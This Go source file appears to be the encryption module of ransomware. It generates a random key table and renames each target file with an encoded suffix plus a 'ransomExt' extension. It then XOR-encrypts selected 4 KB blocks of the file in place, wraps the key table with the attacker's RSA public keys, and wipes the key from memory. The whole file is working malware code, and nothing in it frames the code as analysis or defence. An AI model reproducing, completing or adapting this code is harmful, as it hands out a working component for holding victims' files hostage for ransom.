package keytab


import (
  "os"
  "io"
  mathrand "math/rand"
  cryptorand "crypto/rand"
  "crypto/sha512"
  "crypto/rsa"
  "encoding/base64"
  "unsafe"
)


// Key table size
const EncKeyTabSize = 0x100000
// Key table hash size
const EncKeyTabHashSize = 32

// Max number of blocks
const MaxNumBlocks = 25
// Block size
const BlockSize = 4096

// Key1 size
const Key1Size = 0x19000
// Key2 size
const Key2Size = 0xC00


// Key table structure
type EncryptionKeyTab struct {
  Data []byte
  Hash []byte
}


// Generate key table
func GenKeyTab() *EncryptionKeyTab {

  data := make([]byte, EncKeyTabSize)
  cryptorand.Read(data)

  var keytab EncryptionKeyTab

  keytab.Data = data

  hash := sha512.Sum512_256(data)

  keytab.Hash = hash[:]

  return &keytab
}


// Encrypt file
func (keytab *EncryptionKeyTab) EncryptFilename(fileName string,
                                                ransomExt string) error {

  n1 := mathrand.Uint32()
  n2 := mathrand.Uint32()

  var extData [42]byte

  copy(extData[:32], keytab.Hash)
  extData[32] = 0xFF
  *(*uint32)(unsafe.Pointer(uintptr(unsafe.Pointer(&extData[33])))) = n1
  *(*uint32)(unsafe.Pointer(uintptr(unsafe.Pointer(&extData[37])))) = n2
  extData[41] = 0x34

  fileExt := base64.URLEncoding.EncodeToString(extData[:])

  newFileName := fileName + "." + fileExt + "." + ransomExt

  // Rename file
  err := os.Rename(fileName, newFileName)
  if err != nil {
    return err
  }

  // Encrypt file data
  return keytab.EvaluateFilename(newFileName, n1, n2)
}


// Encrypt file data
func (keytab *EncryptionKeyTab) EvaluateFilename(fileName string,
                                                 n1, n2 uint32) error {

  f, err := os.OpenFile(fileName, os.O_RDWR, 0600)
  if err != nil {
    return err
  }

  defer f.Close()

  fileInfo, err := f.Stat()
  if err != nil {
    return err
  }

  fileSize := fileInfo.Size()

  var numBlocks int = int(30 * (fileSize / BlockSize) / 100)

  if fileSize == 0 {
    return nil
  }

  if fileSize <= BlockSize {
    numBlocks = 1
  } else if (numBlocks < 2) {
    numBlocks = 2
  } else {
    if (numBlocks > MaxNumBlocks) {
      numBlocks = MaxNumBlocks
    }
  }

  keyData1Pos := n1 % (EncKeyTabSize - Key1Size)
  keyData1 := keytab.Data[keyData1Pos : keyData1Pos + Key1Size]

  keyData2Pos := n2 % (EncKeyTabSize - Key2Size)
  keyData2 := keytab.Data[keyData2Pos : keyData2Pos + Key2Size]

  var buf [BlockSize]byte

  var totalPos int = 0

  var blockSpace int64

  if numBlocks > 1 {
    blockSpace = (fileSize - int64(numBlocks * BlockSize)) /
                 int64(numBlocks - 1)
  } else {
    blockSpace = 0
  }

  var fileOff int64

  for blockNum := 1; blockNum <= numBlocks; blockNum++ {

    if blockNum == 1 {
      fileOff = 0
    } else if blockNum == numBlocks {
      if fileSize > fileOff + BlockSize {
        fileOff = fileSize - BlockSize
      }
    } else {
      fileOff += int64(blockSpace)
    }

    bytesRead, err := f.ReadAt(buf[:], fileOff)
    if (err != nil) && (err != io.EOF) {
      return err
    }

    if bytesRead == 0 {
      break
    }

    // Encrypt block
    for i := 0; i < bytesRead; i++ {
      pos := totalPos + i
      buf[i] ^= keyData1[pos % Key1Size] ^ keyData2[pos % Key2Size]
    }

    _, err = f.WriteAt(buf[:bytesRead], fileOff)
    if err != nil {
      return err
    }

    fileOff += int64(bytesRead)
    totalPos += bytesRead
  }

  return nil
}


// Encrypt key table
func (keytab *EncryptionKeyTab) Export(pubKeys []*rsa.PublicKey) []byte {

  dstData := make([]byte, 0, 2 * EncKeyTabSize)

  pos := 0
  remLen := len(keytab.Data)
  numKeys := len(pubKeys)

  i := 0

  for remLen > 0 {

    pubKey := pubKeys[i % numKeys]

    chunkSize := pubKey.Size() - (2 * 32 + 2)
    if chunkSize > remLen {
      chunkSize = remLen
    }

    hash := sha512.New512_256()

    rng := cryptorand.Reader

    encChunk, _ := rsa.EncryptOAEP(hash, rng, pubKey,
                                   keytab.Data[pos : pos + chunkSize],
                                   nil)

    dstData = append(dstData, encChunk...)

    pos += chunkSize
    remLen -= chunkSize
    i++
  }

  return dstData
}


// Erase key table
func (keytab *EncryptionKeyTab) Erase() {

  // Clear key table
  for i := range keytab.Data {
    keytab.Data[i] = 0
  }

  // Clear key table hash
  for i := range keytab.Hash {
    keytab.Hash[i] = 0
  }
}
